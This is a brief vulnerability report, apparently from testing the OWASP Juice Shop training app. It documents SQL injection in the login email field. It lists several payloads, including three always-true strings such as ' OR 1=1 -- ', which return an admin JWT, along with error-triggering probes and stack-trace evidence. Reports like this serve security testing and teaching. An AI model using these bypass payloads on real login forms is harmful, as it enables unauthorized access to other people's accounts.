# SQL Injection in Login Email Field - Multiple Bypass Variants

## Vulnerability Class
SQL Injection (SQLi)

## Endpoint
`POST /rest/user/login`

## Vulnerable Parameter
`email`

## Detection Payloads Confirmed
1. `' OR 1=1 -- ` — Returns 200 OK with valid JWT authentication token for admin@juice-sh.op
2. `' OR '1'='1' -- ` — Returns 200 OK with valid JWT authentication token for admin@juice-sh.op
3. `admin@juice-sh.op'--` — Returns 200 OK with valid JWT authentication token for admin@juice-sh.op
4. `' ` (bare single quote) — Returns 500 Internal Server Error with SQLite/Sequelize stack trace
5. `' UNION SELECT 1,2,3 -- ` — Returns 500 Internal Server Error (SQLite error)
6. `' trash` — Returns 500 Internal Server Error (SQLite error)

## Evidence
All three "always-true" variants (`' OR 1=1 -- `, `' OR '1'='1' -- `, `admin@juice-sh.op'--`) returned HTTP 200 with a valid JWT token for admin@juice-sh.op:
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

Error payloads returned 500 with:
```
at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
```

## Impact
An attacker can authenticate as any user (including admin) without knowing credentials by injecting SQL into the email parameter. Multiple bypass variants confirmed.

## Risk
**Critical** — Direct authentication bypass with demonstrated successful login as admin using multiple payload variants.